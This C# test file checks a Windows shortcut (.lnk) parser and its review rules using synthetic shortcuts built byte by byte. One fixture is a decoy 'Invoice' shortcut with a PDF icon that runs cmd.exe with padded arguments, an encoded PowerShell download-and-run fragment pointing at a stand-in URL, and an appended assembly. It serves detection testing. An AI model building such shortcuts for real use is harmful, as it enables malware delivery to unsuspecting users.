using System.Text;
using Corvus.Core;
using Corvus.Core.Documents;
using Corvus.Services.Analysis;

namespace Corvus.Tests;

/// <summary>Windows shortcuts: target, strings, link info, extra data blocks, appended data and the review rules.</summary>
public sealed class ShellLinkTests
{
    private static byte[] U16(int v) => BitConverter.GetBytes((ushort)v);
    private static byte[] U32(uint v) => BitConverter.GetBytes(v);

    /// <summary>A shortcut to C:\Windows\System32\cmd.exe with padded arguments, a PDF icon, a tracker block and appended data.</summary>
    internal static byte[] Shortcut(string arguments, byte[]? overlay = null)
    {
        var o = new MemoryStream();
        // Header: size, link CLSID, flags (ID list, link info, name, working dir, arguments, icon, unicode), attributes, times, size, icon index, show minimized.
        o.Write(U32(0x4C)); o.Write(new Guid("00021401-0000-0000-C000-000000000046").ToByteArray());
        o.Write(U32(0x01 | 0x02 | 0x04 | 0x10 | 0x20 | 0x40 | 0x80)); o.Write(U32(0x20));
        var time = BitConverter.GetBytes(new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc).ToFileTimeUtc());
        o.Write(time); o.Write(time); o.Write(time);
        o.Write(U32(289792)); o.Write(BitConverter.GetBytes(13)); o.Write(U32(7)); o.Write(U16(0x0641)); o.Write(new byte[10]);
        // ID list: This PC, C:\, Windows, System32, cmd.exe (long names in 0xBEEF0004 blocks).
        var ids = new MemoryStream();
        void Item(byte[] body) { ids.Write(U16(body.Length + 2)); ids.Write(body); }
        Item([0x1F, 0x50, .. new Guid("20D04FE0-3AEA-1069-A2D8-08002B30309D").ToByteArray()]);
        Item([0x2F, .. "C:\\"u8.ToArray(), .. new byte[19]]);
        foreach (var (name, type) in new[] { ("Windows", 0x31), ("System32", 0x31), ("cmd.exe", 0x32) })
        {
            var shortName = Encoding.ASCII.GetBytes(name.ToUpperInvariant() + "\0");
            var ext = new MemoryStream();
            var longName = Encoding.Unicode.GetBytes(name + "\0");
            ext.Write(U16(46 + longName.Length + 2)); ext.Write(U16(9)); ext.Write(U32(0xBEEF0004)); ext.Write(new byte[38]); ext.Write(longName); ext.Write(U16(0));
            Item([(byte)type, 0, .. U32(1000), .. new byte[6], .. shortName, .. (shortName.Length % 2 == 1 ? new byte[] { 0 } : []), .. ext.ToArray()]);
        }
        ids.Write(U16(0));
        o.Write(U16((int)ids.Length)); o.Write(ids.ToArray());
        // Link info: volume id (fixed, serial, label) and the local base path.
        var label = Encoding.ASCII.GetBytes("OS\0");
        var volume = new MemoryStream();
        volume.Write(U32((uint)(16 + label.Length))); volume.Write(U32(3)); volume.Write(U32(0x1234ABCD)); volume.Write(U32(16)); volume.Write(label);
        var basePath = Encoding.ASCII.GetBytes(@"C:\Windows\System32\cmd.exe" + "\0");
        uint volumeAt = 28, baseAt = (uint)(28 + volume.Length), suffixAt = (uint)(baseAt + basePath.Length);
        var info = new MemoryStream();
        info.Write(U32((uint)(suffixAt + 1))); info.Write(U32(28)); info.Write(U32(1)); info.Write(U32(volumeAt)); info.Write(U32(baseAt)); info.Write(U32(0)); info.Write(U32(suffixAt));
        info.Write(volume.ToArray()); info.Write(basePath); info.WriteByte(0);
        o.Write(info.ToArray());
        void Str(string s) { o.Write(U16(s.Length)); o.Write(Encoding.Unicode.GetBytes(s)); }
        Str("Invoice"); Str(@"C:\Users\Public"); Str(arguments); Str(@"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe");
        // Extra data: tracker (machine id, droids; the file droid a version 1 GUID ending in the MAC) and the terminal block.
        o.Write(U32(0x60)); o.Write(U32(0xA0000003)); o.Write(U32(0x58)); o.Write(U32(0));
        var machine = new byte[16]; Encoding.ASCII.GetBytes("desktop-7q1").CopyTo(machine, 0); o.Write(machine);
        var droid = new Guid("11111111-2222-3333-4444-555555555555").ToByteArray();
        var fileDroid = new Guid("e3a1c3d4-1f2e-11ee-9a5b-0800273e1a2b").ToByteArray();
        o.Write(droid); o.Write(fileDroid); o.Write(droid); o.Write(fileDroid);
        o.Write(U32(0));
        if (overlay != null) o.Write(overlay);
        return o.ToArray();
    }

    private static ShellLinkFileView.Facts View(byte[] lnk) =>
        (ShellLinkFileView.Facts)new ShellLinkFileView().Inspect(new FileInput("a.lnk", lnk, Blob.Identify(lnk)), default)!.Detail;

    [Fact]
    public void Fields_come_from_the_header_link_info_strings_and_tracker()
    {
        var f = View(Shortcut("/c start invoice.pdf"));
        Assert.Equal(@"C:\Windows\System32\cmd.exe", f.Target);
        Assert.Equal(@"C:\Windows\System32\cmd.exe", f.IdListPath);
        Assert.Equal(("/c start invoice.pdf", @"C:\Users\Public", "Invoice", 13), (f.Arguments, f.WorkingDirectory, f.Description, f.IconIndex));
        Assert.Equal(("fixed", "1234ABCD", "OS"), (f.DriveType, f.VolumeSerial, f.VolumeLabel));
        Assert.Equal(("desktop-7q1", "08:00:27:3e:1a:2b"), (f.MachineId, f.MacAddress));
        Assert.Equal(("minimized, not activated", 289792L, "archive"), (f.ShowCommand, f.TargetSize, f.Attributes));
        Assert.Equal(new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc), f.Created);
        Assert.Contains("Tracker", f.ExtraBlocks);
    }

    [Fact]
    public void Review_rules_flag_the_interpreter_padding_icon_and_appended_data()
    {
        var args = new string(' ', 120) + "/c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA http://example.test/a";
        var overlay = ContainerFixtures.Module("Dropped");
        var f = View(Shortcut(args, overlay));
        var keywords = f.Findings.Select(x => x.Keyword).ToList();
        Assert.Contains("cmd.exe", keywords);
        Assert.Contains("padded arguments", keywords);
        Assert.Contains("minimized window", keywords);
        Assert.Contains("document icon", keywords);
        Assert.Contains("appended data", keywords);
        Assert.Contains("http://example.test/a", keywords);
        Assert.Contains(f.Findings, x => x.Description.StartsWith("encoded", StringComparison.Ordinal));
        Assert.Equal(".NET assembly", f.AppendedData!.Kind);
        var c = Containers.Open(Shortcut(args, overlay), "a.lnk", AnalysisLimits.Default, default);
        Assert.Equal(overlay, Assert.Single(c.Items).Bytes);
    }

    [Fact]
    [FuzzEntry(typeof(ShellLinkReader), typeof(ShellLink), typeof(ShellLinkFileView))]
    public void Fuzzed_shortcuts_never_throw_past_a_tool_error()
    {
        var failures = FormatFuzz.Run(Shortcut("/c calc", [1, 2, 3]), b =>
        {
            try { Containers.Open(b, "a.lnk", AnalysisLimits.Default, default); } catch (ToolError) { }
            try { new ShellLinkFileView().Inspect(new FileInput("a.lnk", b, Blob.Identify(b)), default); } catch (ToolError) { }
        }, 300);
        Assert.True(failures.Count == 0, string.Join("\n", failures.Take(20)));
    }
}
